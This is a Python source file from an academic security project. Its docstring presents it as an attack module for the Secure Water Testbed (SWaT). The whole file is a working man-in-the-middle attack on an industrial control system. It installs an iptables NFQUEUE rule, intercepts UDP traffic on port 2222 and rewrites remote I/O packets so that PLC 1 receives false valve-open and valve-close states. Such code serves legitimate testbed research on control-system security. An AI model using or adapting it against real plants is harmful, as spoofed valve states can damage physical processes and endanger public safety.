#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2015 David I. Urbina, UTD
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
"""Secure Water Testbed (SWaT) Singapore University of Technology and Design.
SWATAttack module to spoof the valve in PLC 1.
"""
from __future__ import print_function
from netfilterqueue import NetfilterQueue
import os

from scapy.layers.inet import IP
from scapy.layers.inet import UDP

import swat


# Parameters list
valve = False  # True is open, False is close


def __spoof(packet):
    pkt = IP(packet.get_payload())
    if swat.SWAT_P1_RIO_DI in pkt:
        pkt[swat.SWAT_P1_RIO_DI].valve_close = 0 if valve else 1
        pkt[swat.SWAT_P1_RIO_DI].valve_open = 1 if valve else 0
        del pkt[UDP].chksum  # Need to recompute checksum
        packet.set_payload(str(pkt))

    if swat.SWAT_P1_RIO_DO in pkt:
        if pkt[swat.SWAT_P1_RIO_DO].number == 1:  # To avoid Multicast with same length
            pkt[swat.SWAT_P1_RIO_DO].valve_close = 1 if valve else 0
            pkt[swat.SWAT_P1_RIO_DO].valve_open = 0 if valve else 1
            del pkt[UDP].chksum  # Need to recompute checksum
            packet.set_payload(str(pkt))

    packet.accept()


def start():
    __setup()
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, __spoof)
    try:
        print("[*] starting valve spoofing")
        nfqueue.run()
    except KeyboardInterrupt:
        __setdown()
        print("[*] stopping valve spoofing")
        nfqueue.unbind()


def configure():
    global valve
    valve = input('Set valve state Open(1) or Close(0):')
    valve = True if valve else False
    params()


def params():
    state = 'Open' if valve else 'Close'
    value = 1 if valve else 0
    print('Valve : {} ({})'.format(state, value))


def __setup():
    os.system('sudo iptables -t mangle -A PREROUTING -p udp --dport 2222 -j NFQUEUE')


def __setdown():
    os.system('sudo iptables -t mangle -F')
